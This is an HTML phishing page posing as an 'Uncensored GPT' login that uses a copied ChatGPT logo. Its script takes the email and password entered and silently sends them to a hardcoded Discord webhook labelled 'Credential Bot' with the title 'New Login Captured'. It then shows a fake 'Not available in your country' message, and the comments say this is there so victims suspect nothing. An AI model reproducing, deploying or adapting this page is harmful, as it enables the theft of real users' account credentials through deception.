<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uncensored GPT</title>
    <style>
        :root {
 --background-color: #1e1e1e;
 --form-bg-color: #2d2d2d;
 --text-color: #e0e0e0;
 --input-bg-color: #3c3c3c;
 --button-bg-color: #c23d3d;
 --button-hover-color: #a83535;
        }
        body {
 font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 background-color: var(--background-color);
 color: var(--text-color);
 display: flex;
 justify-content: center;
 align-items: center;
 height: 100vh;
 margin: 0;
        }
        .container {
 text-align: center;
 background-color: var(--form-bg-color);
 padding: 40px;
 border-radius: 12px;
 box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
 width: 320px;
        }
        .logo {
 width: 80px;
 height: 80px;
 margin-bottom: 20px;
 /* This filter makes the SVG red */
 filter: grayscale(1) sepia(1) hue-rotate(315deg) saturate(5) brightness(0.9);
        }
        h1 {
 margin: 0 0 25px 0;
 font-size: 24px;
 font-weight: 600;
        }
        .login-form input {
 width: 100%;
 padding: 12px;
 margin-bottom: 15px;
 border-radius: 6px;
 border: 1px solid var(--input-bg-color);
 background-color: var(--input-bg-color);
 color: var(--text-color);
 box-sizing: border-box;
 font-size: 16px;
        }
        .login-form input:focus {
 outline: none;
 border-color: var(--button-bg-color);
        }
        .login-form button {
 width: 100%;
 padding: 12px;
 border: none;
 border-radius: 6px;
 background-color: var(--button-bg-color);
 color: white;
 font-size: 16px;
 font-weight: bold;
 cursor: pointer;
 transition: background-color 0.2s;
        }
        .login-form button:hover {
 background-color: var(--button-hover-color);
        }
        #final-message {
 display: none; /* Hidden by default */
 font-size: 18px;
 padding: 20px 0;
        }
    </style>
</head>
<body>

    <div class="container" id="login-container">
        <!-- A self-contained SVG for the ChatGPT logo -->
        <svg class="logo" width="41" height="41" viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">
 <path d="M35.216 20.5C35.216 28.663 28.663 35.216 20.5 35.216C12.337 35.216 5.784 28.663 5.784 20.5C5.784 12.337 12.337 5.784 20.5 5.784C23.2358 5.78405 25.8811 6.55191 28.168 7.948L25.891 10.225C24.249 9.253 22.411 8.731 20.5 8.731C13.91 8.731 8.731 13.91 8.731 20.5C8.731 27.09 13.91 32.269 20.5 32.269C27.09 32.269 32.269 27.09 32.269 20.5C32.269 19.826 32.203 19.167 32.08 18.529L34.931 17.761C35.129 18.663 35.216 19.576 35.216 20.5Z" fill="#FFFFFF"></path>
 <path d="M22.5899 15.239L20.0499 9.223L17.5099 15.239L11.4939 17.779L17.5099 20.319L20.0499 26.335L22.5899 20.319L28.6059 17.779L22.5899 15.239Z" fill="#FFFFFF"></path>
        </svg>
        <h1>uncensored gpt</h1>
        <form class="login-form" id="login-form">
 <input type="email" id="email" placeholder="Email address" required>
 <input type="password" id="password" placeholder="Password" required>
 <button type="submit">Continue</button>
        </form>
        <div id="final-message">
 Not available in your country.
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('login-form');
        const loginContainer = document.getElementById('login-container');
        const finalMessage = document.getElementById('final-message');

        loginForm.addEventListener('submit', async (event) => {
 // 1. Prevent the form from reloading the page
 event.preventDefault();

 // 2. Get the values from the input fields
 const email = document.getElementById('email').value;
 const password = document.getElementById('password').value;
 
 // This is the "validation" check. It only ensures the fields are not empty.
 if (!email || !password) {
 return; // Do nothing if fields are empty
 }

 // 3. Define the webhook URL and the data payload
 const webhookUrl = 'https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p';
 const payload = {
 username: "Credential Bot",
 avatar_url: "https://i.imgur.com/fBCF18F.png",
 embeds: [{
 title: "New Login Captured",
 color: 12745742, // A reddish color
 fields: [
 { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
 { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false }
 ],
 footer: {
 text: `Captured at ${new Date().toISOString()}`
 }
 }]
 };

 // 4. Send the data to the Discord webhook silently
 try {
 await fetch(webhookUrl, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify(payload)
 });
 } catch (error) {
 // The fetch will happen in the background. Even if it fails,
 // the user experience continues, so they don't suspect anything.
 console.log("Error sending webhook, but proceeding for user.");
 }
 
 // 5. Change the UI to complete the illusion
 loginForm.style.display = 'none'; // Hide the form
 finalMessage.style.display = 'block'; // Show the "unavailable" message
        });
    </script>

</body>
</html>
